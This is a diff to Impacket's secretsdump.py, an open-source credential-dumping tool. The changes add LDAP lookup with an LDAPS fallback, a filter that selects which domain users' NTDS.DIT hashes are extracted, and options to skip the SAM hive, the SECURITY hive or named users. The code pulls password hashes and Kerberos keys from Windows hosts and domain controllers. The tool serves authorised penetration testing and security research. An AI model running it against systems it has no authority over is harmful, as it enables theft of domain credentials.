@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # Impacket - Collection of Python classes for working with network protocols.
 #
-# SECUREAUTH LABS. Copyright (C) 2022 SecureAuth Corporation. All rights reserved.
+# Copyright (C) 2023 Fortra. All rights reserved.
 #
 # This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -60,6 +60,7 @@ from impacket import version
 from impacket.examples import logger
 from impacket.examples.utils import parse_target
 from impacket.smbconnection import SMBConnection
+from impacket.ldap.ldap import LDAPConnection, LDAPSessionError
 
 from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes, \
     KeyListSecrets
@@ -83,6 +84,7 @@ class DumpSecrets:
         self.__aesKey = options.aesKey
         self.__aesKeyRodc = options.rodcKey
         self.__smbConnection = None
+        self.__ldapConnection = None
         self.__remoteOps = None
         self.__SAMHashes = None
         self.__NTDSHashes = None
@@ -94,6 +96,8 @@ class DumpSecrets:
         self.__securityHive = options.security
         self.__samHive = options.sam
         self.__ntdsFile = options.ntds
+        self.__skipSam = options.skip_sam
+        self.__skipSecurity = options.skip_security
         self.__history = options.history
         self.__noLMHash = True
         self.__isRemote = True
@@ -102,6 +106,8 @@ class DumpSecrets:
         self.__justDC = options.just_dc
         self.__justDCNTLM = options.just_dc_ntlm
         self.__justUser = options.just_dc_user
+        self.__ldapFilter = options.ldapfilter
+        self.__skipUser = options.skip_user
         self.__pwdLastSet = options.pwd_last_set
         self.__printUserStatus= options.user_status
         self.__resumeFileName = options.resumefile
@@ -119,6 +125,46 @@ class DumpSecrets:
                                                self.__nthash, self.__aesKey, self.__kdcHost)
         else:
             self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+
+    def ldapConnect(self):
+        if self.__doKerberos:
+            self.__target = self.__remoteHost
+        else:
+            if self.__kdcHost is not None:
+                self.__target = self.__kdcHost
+            else:
+                self.__target = self.__domain
+
+        # Create the baseDN
+        if self.__domain:
+            domainParts = self.__domain.split('.')
+        else:
+            domain = self.__target.split('.', 1)[-1]
+            domainParts = domain.split('.')
+        self.baseDN = ''
+        for i in domainParts:
+            self.baseDN += 'dc=%s,' % i
+        # Remove last ','
+        self.baseDN = self.baseDN[:-1]
+
+        try:
+            self.__ldapConnection = LDAPConnection('ldap://%s' % self.__target, self.baseDN, self.__kdcHost)
+            if self.__doKerberos is not True:
+                self.__ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+            else:
+                self.__ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
+                                                    self.__aesKey, kdcHost=self.__kdcHost)
+        except LDAPSessionError as e:
+            if str(e).find('strongerAuthRequired') >= 0:
+                # We need to try SSL
+                self.__ldapConnection = LDAPConnection('ldaps://%s' % self.__target, self.baseDN, self.__kdcHost)
+                if self.__doKerberos is not True:
+                    self.__ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+                else:
+                    self.__ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
+                                                        self.__aesKey, kdcHost=self.__kdcHost)
+            else:
+                raise
 
     def dump(self):
         try:
@@ -138,6 +184,12 @@ class DumpSecrets:
             else:
                 self.__isRemote = True
                 bootKey = None
+                if self.__ldapFilter is not None:
+                    logging.info('Querying %s for information about domain users via LDAP' % self.__domain)
+                    try:
+                        self.ldapConnect()
+                    except Exception as e:
+                        logging.error('LDAP connection failed: %s' % str(e))
                 try:
                     try:
                         self.connect()
@@ -151,7 +203,7 @@ class DumpSecrets:
                         else:
                             raise
 
-                    self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
+                    self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost, self.__ldapConnection)
                     self.__remoteOps.setExecMethod(self.__options.exec_method)
                     if self.__justDC is False and self.__justDCNTLM is False and self.__useKeyListMethod is False or self.__useVSSMethod is True:
                         self.__remoteOps.enableRegistry()
@@ -178,38 +230,40 @@ class DumpSecrets:
             else:
                 # If RemoteOperations succeeded, then we can extract SAM and LSA
                 if self.__justDC is False and self.__justDCNTLM is False and self.__canProcessSAMLSA:
-                    try:
-                        if self.__isRemote is True:
-                            SAMFileName = self.__remoteOps.saveSAM()
-                        else:
-                            SAMFileName = self.__samHive
+                    if not self.__skipSam:
+                        try:
+                            if self.__isRemote is True:
+                                SAMFileName = self.__remoteOps.saveSAM()
+                            else:
+                                SAMFileName = self.__samHive
 
-                        self.__SAMHashes = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
-                        self.__SAMHashes.dump()
-                        if self.__outputFileName is not None:
-                            self.__SAMHashes.export(self.__outputFileName)
-                    except Exception as e:
-                        logging.error('SAM hashes extraction failed: %s' % str(e))
+                            self.__SAMHashes = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
+                            self.__SAMHashes.dump()
+                            if self.__outputFileName is not None:
+                                self.__SAMHashes.export(self.__outputFileName)
+                        except Exception as e:
+                            logging.error('SAM hashes extraction failed: %s' % str(e))
 
-                    try:
-                        if self.__isRemote is True:
-                            SECURITYFileName = self.__remoteOps.saveSECURITY()
-                        else:
-                            SECURITYFileName = self.__securityHive
+                    if not self.__skipSecurity:
+                        try:
+                            if self.__isRemote is True:
+                                SECURITYFileName = self.__remoteOps.saveSECURITY()
+                            else:
+                                SECURITYFileName = self.__securityHive
 
-                        self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
+                            self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
                                                        isRemote=self.__isRemote, history=self.__history)
-                        self.__LSASecrets.dumpCachedHashes()
-                        if self.__outputFileName is not None:
-                            self.__LSASecrets.exportCached(self.__outputFileName)
-                        self.__LSASecrets.dumpSecrets()
-                        if self.__outputFileName is not None:
-                            self.__LSASecrets.exportSecrets(self.__outputFileName)
-                    except Exception as e:
-                        if logging.getLogger().level == logging.DEBUG:
-                            import traceback
-                            traceback.print_exc()
-                        logging.error('LSA hashes extraction failed: %s' % str(e))
+                            self.__LSASecrets.dumpCachedHashes()
+                            if self.__outputFileName is not None:
+                                self.__LSASecrets.exportCached(self.__outputFileName)
+                            self.__LSASecrets.dumpSecrets()
+                            if self.__outputFileName is not None:
+                                self.__LSASecrets.exportSecrets(self.__outputFileName)
+                        except Exception as e:
+                            if logging.getLogger().level == logging.DEBUG:
+                                import traceback
+                                traceback.print_exc()
+                            logging.error('LSA hashes extraction failed: %s' % str(e))
 
                 # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
                 if self.__isRemote is True:
@@ -224,8 +278,9 @@ class DumpSecrets:
                                                noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
                                                useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,
                                                pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
-                                               outputFileName=self.__outputFileName, justUser=self.__justUser,
-                                               printUserStatus= self.__printUserStatus)
+                                               outputFileName=self.__outputFileName, justUser=self.__justUser, 
+                                               skipUser=self.__skipUser, ldapFilter=self.__ldapFilter,
+                                               printUserStatus=self.__printUserStatus)
                 try:
                     self.__NTDSHashes.dump()
                 except Exception as e:
@@ -239,7 +294,7 @@ class DumpSecrets:
                         if resumeFile is not None:
                             os.unlink(resumeFile)
                     logging.error(e)
-                    if self.__justUser and str(e).find("ERROR_DS_NAME_ERROR_NOT_UNIQUE") >=0:
+                    if (self.__justUser or self.__ldapFilter) and str(e).find("ERROR_DS_NAME_ERROR_NOT_UNIQUE") >= 0:
                         logging.info("You just got that error because there might be some duplicates of the same name. "
                                      "Try specifying the domain name for the user as well. It is important to specify it "
                                      "in the form of NetBIOS domain name/user (e.g. contoso/Administratror).")
@@ -311,6 +366,8 @@ if __name__ == '__main__':
     parser.add_argument('-resumefile', action='store', help='resume file name to resume NTDS.DIT session dump (only '
                          'available to DRSUAPI approach). This file will also be used to keep updating the session\'s '
                          'state')
+    parser.add_argument('-skip-sam', action='store_true', help='Do NOT parse the SAM hive on remote system')
+    parser.add_argument('-skip-security', action='store_true', help='Do NOT parse the SECURITY hive on remote system')
     parser.add_argument('-outputfile', action='store',
                         help='base output filename. Extensions will be added for sam, secrets, cached and ntds')
     parser.add_argument('-use-vss', action='store_true', default=False,
@@ -326,10 +383,15 @@ if __name__ == '__main__':
     group.add_argument('-just-dc-user', action='store', metavar='USERNAME',
                        help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. '
                             'Implies also -just-dc switch')
+    group.add_argument('-ldapfilter', action='store', metavar='LDAPFILTER',
+                       help='Extract only NTDS.DIT data for specific users based on an LDAP filter. '
+                            'Only available for DRSUAPI approach. Implies also -just-dc switch')
     group.add_argument('-just-dc', action='store_true', default=False,
                         help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
     group.add_argument('-just-dc-ntlm', action='store_true', default=False,
                        help='Extract only NTDS.DIT data (NTLM hashes only)')
+    group.add_argument('-skip-user', action='store', help='Do NOT extract NTDS.DIT data for the user specified. '
+                            'Can provide comma-separated list of users to skip, or text file with one user per line')
     group.add_argument('-pwd-last-set', action='store_true', default=False,
                        help='Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\'t apply to -outputfile data')
     group.add_argument('-user-status', action='store_true', default=False,
@@ -371,7 +433,7 @@ if __name__ == '__main__':
 
     domain, username, password, remoteName = parse_target(options.target)
 
-    if options.just_dc_user is not None:
+    if options.just_dc_user is not None or options.ldapfilter is not None:
         if options.use_vss is True:
             logging.error('-just-dc-user switch is not supported in VSS mode')
             sys.exit(1)
